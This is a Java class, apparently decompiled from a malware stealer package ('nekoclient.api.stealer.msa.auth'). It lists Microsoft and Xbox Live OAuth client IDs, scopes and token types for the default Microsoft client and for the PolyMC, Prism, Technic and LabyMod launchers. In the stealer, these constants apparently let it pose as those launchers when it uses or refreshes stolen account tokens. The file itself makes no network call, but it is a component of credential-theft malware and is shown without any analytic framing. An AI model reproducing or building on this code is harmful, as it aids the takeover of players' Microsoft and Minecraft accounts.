package dev.neko.nekoclient.api.stealer.msa.auth;

public class ClientType {
   public static final String EXTERNAL_TOKEN_TYPE = "d";
   public static final String DEFAULT_SCOPE = "service::user.auth.xboxlive.com::mbi_ssl";
   public static final String EXTERNAL_SCOPE = "XboxLive.signin offline_access";
   public static final String DEFAULT_TOKEN_TYPE = "t";
   public static final ClientType DEFAULT = new ClientType("00000000402B5328", "service::user.auth.xboxlive.com::mbi_ssl", "t");
   public static final ClientType POLYMC = new ClientType("6b329578-bfec-42a3-b503-303ab3f2ac96", "XboxLive.signin offline_access", "d");
   public static final ClientType PRISM = new ClientType("c36a9fb6-4f2a-41ff-90bd-ae7cc92031eb", "XboxLive.signin offline_access", "d");
   public static final ClientType TECHNIC_LAUNCHER = new ClientType("8dfabc1d-38a9-42d8-bc08-677dbc60fe65", "XboxLive.signin offline_access", "d");
   public static final ClientType LABYMOD = new ClientType("27843883-6e3b-42cb-9e51-4f55a700601e", "XboxLive.signin offline_access", "d");
   private final String clientId;
   private final String scope;
   private final String tokenType;

   public ClientType(String clientId, String scope, String tokenType) {
      this.clientId = clientId;
      this.scope = scope;
      this.tokenType = tokenType;
   }

   public final String getClientId() {
      return this.clientId;
   }

   public final String getScope() {
      return this.scope;
   }

   public final String getTokenType() {
      return this.tokenType;
   }
}
